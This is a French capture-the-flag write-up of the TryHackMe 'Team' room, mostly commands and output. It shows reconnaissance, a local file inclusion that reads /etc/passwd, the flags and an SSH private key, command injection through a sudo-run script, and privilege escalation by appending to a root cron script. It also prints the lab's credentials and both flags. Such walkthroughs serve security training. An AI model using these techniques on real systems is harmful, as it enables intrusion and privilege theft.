# Team #

## Task 1 Deploy the box ##

**Deployed**

Cliquez sur start machine.   

## Task 2 Flags ##

```bash
tim@kali:~/Bureau/tryhackme$ sudo  sh -c "echo '10.10.188.190 team.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme$ sudo nmap -A team.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 09:33 CEST
Nmap scan report for team.thm (10.10.188.190)
Host is up (0.035s latency).
rDNS record for 10.10.188.190: team.thc
Not shown: 65532 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
|_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Team
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Linux 2.6.39 - 3.2 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   36.63 ms 10.9.0.1
2   36.99 ms team.thc (10.10.188.190)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.50 seconds

```

D'après le scan voit 3 services :    
Le service FTP sur le port 21.   
Le service SSH sur le port 22.   
Le service HTTP sur lr port 80.   

```bash
tim@kali:~/Bureau/tryhackme$ ftp team.thm
Connected to team.thm.
220 (vsFTPd 3.0.3)
Name (team.thm:tim): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
```

Sur le service FTP l'identification avec anonymous ne fonctionne pas.
Il faut des identifiants valides.   

![page1](./Task2-01.png)

Sur la page principale on trouve rien.   

```bash
tim@kali:~/Bureau/tryhackme$ gobuster dir -u http://team.thm -w /usr/share/dirb/wordlists/common.txt -x txt -q
/.hta                 (Status: 403) [Size: 273]
/.hta.txt             (Status: 403) [Size: 273]
/.htaccess            (Status: 403) [Size: 273]
/.htaccess.txt        (Status: 403) [Size: 273]
/.htpasswd            (Status: 403) [Size: 273]
/.htpasswd.txt        (Status: 403) [Size: 273]
/assets               (Status: 301) [Size: 305] [--> http://team.thm/assets/]
/images               (Status: 301) [Size: 305] [--> http://team.thm/images/]
/index.html           (Status: 200) [Size: 2966]                             
/robots.txt           (Status: 200) [Size: 5]                                
/robots.txt           (Status: 200) [Size: 5]                                
/scripts              (Status: 301) [Size: 306] [--> http://team.thm/scripts/]
/server-status        (Status: 403) [Size: 273]                          

tim@kali:~/Bureau/tryhackme$ gobuster dir -u http://team.thm/scripts/ -w /usr/share/dirb/wordlists/common.txt -x txt -q
/.hta                 (Status: 403) [Size: 273]
/.hta.txt             (Status: 403) [Size: 273]
/.htaccess.txt        (Status: 403) [Size: 273]
/.htaccess            (Status: 403) [Size: 273]
/.htpasswd            (Status: 403) [Size: 273]
/.htpasswd.txt        (Status: 403) [Size: 273]
/script.txt           (Status: 200) [Size: 597]
```

On trouve un fichier script.txt

```bash
tim@kali:~/Bureau/tryhackme$ curl http://team.thm/scripts/script.txt
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in

```

On voit un script.
A la fin du script il y un commentaire qui dit qu'il y a un ancien script avec l'extension old.   

```bash
tim@kali:~/Bureau/tryhackme$ curl http://team.thm/scripts/script.old
#!/bin/bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit
```

Dans l'ancien script nous avons des identifiants :    
nom d'utilisateur : ftpuser     
mot de passe : T3@m$h@r3

```bash
tim@kali:~/Bureau/tryhackme$ ftp team.thm 
Connected to team.thm.
220 (vsFTPd 3.0.3)
Name (team.thm:tim): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    2 65534    65534        4096 Jan 15  2021 workshare
226 Directory send OK.

tp> cd workshare
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 1002     1002          269 Jan 15  2021 New_site.txt
226 Directory send OK.

ftp> get New_site.txt
local: New_site.txt remote: New_site.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for New_site.txt (269 bytes).
226 Transfer complete.
269 bytes received in 0.00 secs (86.2994 kB/s)
```

On se connect avec les nouveaux identifiants sur le service FTP.    
On trouve le fichier New_site.txt.     
On récupère le fichier.    

```bash
tim@kali:~/Bureau/tryhackme$ cat New_site.txt 
Dale
	I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles 
```

Dans le fichier il est dit qu'il y a un site de développement avec .dev dans le nom de domaine.   
On doit aussi trouver un fichier id_rsa sur le site.   
On a deux noms Dale et Gyles.   

```bash
tim@kali:~/Bureau/tryhackme$ sudo  sh -c "echo '10.10.188.190 dev.team.thm' >> /etc/hosts"
```

On configure le nouveau nom de domaine.    

![page2](./Task2-02.png)

Sur la page principale on a un lien.    

![page3](./Task2-03.png)

Sur le lien on mettre un fichier en paramètre.   

```bash
tim@kali:~/Bureau/tryhackme$ curl http://dev.team.thm/script.php?page=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
dale:x:1000:1000:anon,,,:/home/dale:/bin/bash
gyles:x:1001:1001::/home/gyles:/bin/bash
ftpuser:x:1002:1002::/home/ftpuser:/bin/sh
ftp:x:110:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
```

On lire le fichier etc\/passwd\/ on remarque les deux noms dale et gyles.   

**user.txt**
```bash
tim@kali:~/Bureau/tryhackme$ curl http://dev.team.thm/script.php?page=/home/dale/user.txt

THM{6Y0TXHz7c2d}
```

On lit le contenu du fichier user.txt. 
La réponse est : THM{6Y0TXHz7c2d}    

**root.txt**

```bash
tim@kali:~/Bureau/tryhackme$ curl http://dev.team.thm/script.php?page=/etc/ssh/sshd_config

#	$OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:
#RSAAuthentication yes

#LoginGraceTime 2m
PermitRootLogin without-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

PubkeyAuthentication yes
PubkeyAcceptedKeyTypes=+ssh-dss
# Expect .ssh/authorized_keys2 to be disregarded by default in future.
#AuthorizedKeysFile	/home/%u/.ssh/authorized_keys

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
#PasswordAuthentication yes
#PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
ChallengeResponseAuthentication no

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the ChallengeResponseAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via ChallengeResponseAuthentication may bypass
# the setting of "PermitRootLogin without-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and ChallengeResponseAuthentication to 'no'.
UsePAM no

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
X11Forwarding yes
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no
#PrintLastLog yes
#TCPKeepAlive yes
#UseLogin no
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem	sftp	/usr/lib/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#	X11Forwarding no
#	AllowTcpForwarding no
#	PermitTTY no
#	ForceCommand cvs server

AllowUsers dale gyles



#Dale id_rsa
#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
#NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE
#NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W
#oG+RPqP8P6/uflU0ftxkHE54H1Ll03HbN+0H4JM/InXvuz4U9Df09m99JYi6DVw5XGsaWK
#o9WqHhL5XS8lYu/fy5VAYOfJ0pyTh8IdhFUuAzfuC+fj0BcQ6ePFhxEF6WaNCSpK2v+qxP
#zMUILQdztr8WhURTxuaOQOIxQ2xJ+zWDKMiynzJ/lzwmI4EiOKj1/nh/w7I8rk6jBjaqAu
#k5xumOxPnyWAGiM0XOBSfgaU+eADcaGfwSF1a0gI8G/TtJfbcW33gnwZBVhc30uLG8JoKS
#xtA1J4yRazjEqK8hU8FUvowsGGls+trkxBYgceWwJFUudYjBq2NbX2glKz52vqFZdbAa1S
#0soiabHiuwd+3N/ygsSuDhOhKIg4MWH6VeJcSMIrAAAFkNt4pcTbeKXEAAAAB3NzaC1yc2
#EAAAGBAJ4OijEx985vuq6nkM5+RywY4K7gfZNq1/13cwq+o73RSyfrh+GVRDVJG4uVlDnU
#eKHJOHRY5NN19Ww7IWorABUSSZIFKtfszSfqfemSBCrZvd2mMt/mIIJYjf1qBvkT6j/D+v
#7n5VNH7cZBxOeB9S5dNx2zftB+CTPyJ177s+FPQ39PZvfSWIug1cOVxrGliqPVqh4S+V0v
#JWLv38uVQGDnydKck4fCHYRVLgM37gvn49AXEOnjxYcRBelmjQkqStr/qsT8zFCC0Hc7a/
#FoVEU8bmjkDiMUNsSfs1gyjIsp8yf5c8JiOBIjio9f54f8OyPK5OowY2qgLpOcbpjsT58l
#gBojNFzgUn4GlPngA3Ghn8EhdWtICPBv07SX23Ft94J8GQVYXN9LixvCaCksbQNSeMkWs4
#xKivIVPBVL6MLBhpbPra5MQWIHHlsCRVLnWIwatjW19oJSs+dr6hWXWwGtUtLKImmx4rsH
#ftzf8oLErg4ToSiIODFh+lXiXEjCKwAAAAMBAAEAAAGAGQ9nG8u3ZbTTXZPV4tekwzoijb
#esUW5UVqzUwbReU99WUjsG7V50VRqFUolh2hV1FvnHiLL7fQer5QAvGR0+QxkGLy/AjkHO
#eXC1jA4JuR2S/Ay47kUXjHMr+C0Sc/WTY47YQghUlPLHoXKWHLq/PB2tenkWN0p0fRb85R
#N1ftjJc+sMAWkJfwH+QqeBvHLp23YqJeCORxcNj3VG/4lnjrXRiyImRhUiBvRWek4o4Rxg
#Q4MUvHDPxc2OKWaIIBbjTbErxACPU3fJSy4MfJ69dwpvePtieFsFQEoJopkEMn1Gkf1Hyi
#U2lCuU7CZtIIjKLh90AT5eMVAntnGlK4H5UO1Vz9Z27ZsOy1Rt5svnhU6X6Pldn6iPgGBW
#/vS5rOqadSFUnoBrE+Cnul2cyLWyKnV+FQHD6YnAU2SXa8dDDlp204qGAJZrOKukXGIdiz
#82aDTaCV/RkdZ2YCb53IWyRw27EniWdO6NvMXG8pZQKwUI2B7wljdgm3ZB6fYNFUv5AAAA
#wQC5Tzei2ZXPj5yN7EgrQk16vUivWP9p6S8KUxHVBvqdJDoQqr8IiPovs9EohFRA3M3h0q
#z+zdN4wIKHMdAg0yaJUUj9WqSwj9ItqNtDxkXpXkfSSgXrfaLz3yXPZTTdvpah+WP5S8u6
#RuSnARrKjgkXT6bKyfGeIVnIpHjUf5/rrnb/QqHyE+AnWGDNQY9HH36gTyMEJZGV/zeBB7
#/ocepv6U5HWlqFB+SCcuhCfkegFif8M7O39K1UUkN6PWb4/IoAAADBAMuCxRbJE9A7sxzx
#sQD/wqj5cQx+HJ82QXZBtwO9cTtxrL1g10DGDK01H+pmWDkuSTcKGOXeU8AzMoM9Jj0ODb
#mPZgp7FnSJDPbeX6an/WzWWibc5DGCmM5VTIkrWdXuuyanEw8CMHUZCMYsltfbzeexKiur
#4fu7GSqPx30NEVfArs2LEqW5Bs/bc/rbZ0UI7/ccfVvHV3qtuNv3ypX4BuQXCkMuDJoBfg
#e9VbKXg7fLF28FxaYlXn25WmXpBHPPdwAAAMEAxtKShv88h0vmaeY0xpgqMN9rjPXvDs5S
#2BRGRg22JACuTYdMFONgWo4on+ptEFPtLA3Ik0DnPqf9KGinc+j6jSYvBdHhvjZleOMMIH
#8kUREDVyzgbpzIlJ5yyawaSjayM+BpYCAuIdI9FHyWAlersYc6ZofLGjbBc3Ay1IoPuOqX
#b1wrZt/BTpIg+d+Fc5/W/k7/9abnt3OBQBf08EwDHcJhSo+4J4TFGIJdMFydxFFr7AyVY7
#CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH
#-----END OPENSSH PRIVATE KEY-----

```

Avec l'indice qui disait de regarder dans les fichiers de configuration on trouve un clef.  
On copie la clef.   

```bash
tim@kali:~/Bureau/tryhackme$ chmod 600 id_rsa 

tim@kali:~/Bureau/tryhackme$ ssh -i id_rsa dale@team.thm
Warning: Permanently added the ECDSA host key for IP address '10.10.188.190' to the list of known hosts.
Last login: Mon Jan 18 10:51:32 2021
dale@TEAM:~$ id
uid=1000(dale) gid=1000(dale) groups=1000(dale),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare),1003(editors)
dale@TEAM:~$ sudo -l
Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
dale@TEAM:~$ 
```

On se connect.
On a les droit de dale.   
Dans la configuration de sudo on peut voir que l'on exécuter un fichier admin_checks avec les droits gyles sans mot de passe.   

```bash
dale@TEAM:~$ ls -al  /home/gyles/admin_checks
-rwxr--r-- 1 gyles editors 399 Jan 15  2021 /home/gyles/admin_checks

dale@TEAM:~$ file /home/gyles/admin_checks
/home/gyles/admin_checks: Bourne-Again shell script, ASCII text executable

dale@TEAM:~$ cat  /home/gyles/admin_checks
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"


```

On regarde le fichier admin_checks.  
On peut pas le modifier.  
Par contre on peut passer un commande dans la variable error.

```bash
dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: toto
Enter 'date' to timestamp the file: bash -i
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
python3 -c 'import pty;pty.spawn("/bin/bash")'

```

On obtient shell avec les droits gyles.  


```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64 -nv
2021-08-11 10:58:57 URL:https://github-releases.githubusercontent.com/120821432/d54f2200-c51c-11e9-8d82-f178cd27b2cb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20210811%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210811T085856Z&X-Amz-Expires=300&X-Amz-Signature=29a20b51171fae910c130c7f86c79f7cb8316bf609614f1c6b44df6f9c0f74c7&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=120821432&response-content-disposition=attachment%3B%20filename%3Dpspy64&response-content-type=application%2Foctet-stream [3078592/3078592] -> "pspy64" [1]

tim@kali:~/Bureau/tryhackme/write-up$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

On prépare à transferer pspy64.  

```bash
gyles@TEAM:/tmp$ wget http://10.9.228.66:8000/pspy64 -nv
2021-08-11 10:02:12 URL:http://10.9.228.66:8000/pspy64 [3078592/3078592] -> "pspy64" [1]

gyles@TEAM:/tmp$ chmod +x pspy64
gyles@TEAM:/tmp$ ./pspy64 
2021/08/11 10:03:03 CMD: UID=0    PID=1      | /sbin/init 
2021/08/11 10:03:36 CMD: UID=0    PID=2215   | ps -e -o pid,ppid,state,command 
2021/08/11 10:04:01 CMD: UID=0    PID=2218   | /bin/bash /opt/admin_stuff/script.sh 
2021/08/11 10:04:01 CMD: UID=0    PID=2217   | /usr/sbin/CRON -f 
2021/08/11 10:04:01 CMD: UID=0    PID=2219   | /bin/bash /usr/local/bin/main_backup.sh 
2021/08/11 10:04:01 CMD: UID=0    PID=2220   | cp -r /var/www/team.thm/assets /var/www/team.thm/images /var/www/team.thm/index.html /var/www/team.thm/robots.txt /var/www/team.thm/scripts /var/backups/www/team.thm/ 
2021/08/11 10:04:01 CMD: UID=0    PID=2221   | /bin/bash /opt/admin_stuff/script.sh 
2021/08/11 10:04:01 CMD: UID=0    PID=2222   | cp -r /var/www/dev.team.thm/index.php /var/www/dev.team.thm/script.php /var/www/dev.team.thm/teamshare.php /var/backups/www/dev/ 
2021/08/11 10:04:38 CMD: UID=0    PID=2223   | ps -e -o pid,ppid,state,command 
2021/08/11 10:05:01 CMD: UID=0    PID=2226   | /bin/bash /usr/local/bin/main_backup.sh 
2021/08/11 10:05:01 CMD: UID=0    PID=2225   | /bin/bash /opt/admin_stuff/script.sh 
2021/08/11 10:05:01 CMD: UID=0    PID=2224   | /usr/sbin/CRON -f 
2021/08/11 10:05:01 CMD: UID=0    PID=2227   | cp -r /var/www/team.thm/assets /var/www/team.thm/images /var/www/team.thm/index.html /var/www/team.thm/robots.txt /var/www/team.thm/scripts /var/backups/www/team.thm/ 
2021/08/11 10:05:01 CMD: UID=0    PID=2229   | cp -r /var/www/dev.team.thm/index.php /var/www/dev.team.thm/script.php /var/www/dev.team.thm/teamshare.php /var/backups/www/dev/ 
2021/08/11 10:05:01 CMD: UID=0    PID=2228   | /bin/bash /usr/local/sbin/dev_backup.sh 

```

On voit un fichier main_backup.sh exécuter toute les 1 minutes.   

```bash
gyles@TEAM:/tmp$ id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
gyles@TEAM:/tmp$ ls -al /usr/local/bin/main_backup.sh
-rwxrwxr-x 1 root admin 65 Jan 17  2021 /usr/local/bin/main_backup.sh
gyles@TEAM:/tmp$ cat /usr/local/bin/main_backup.sh

#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
```

On remarque que l'on fait l'on fait partie du groupe admin, admin à le droit d'écriture sur le fichier.    

```bash
gyles@TEAM:/tmp$ echo "cat /root/root.txt > /tmp/powned.txt" >> /usr/local/bin/main_backup.sh
gyles@TEAM:/tmp$ cat powned.txt
THM{fhqbznavfonq}
```

On modifie le script pour que la réponse soit mise dans un endroit ou peut là lire.   

La réponse est : THM{fhqbznavfonq}   
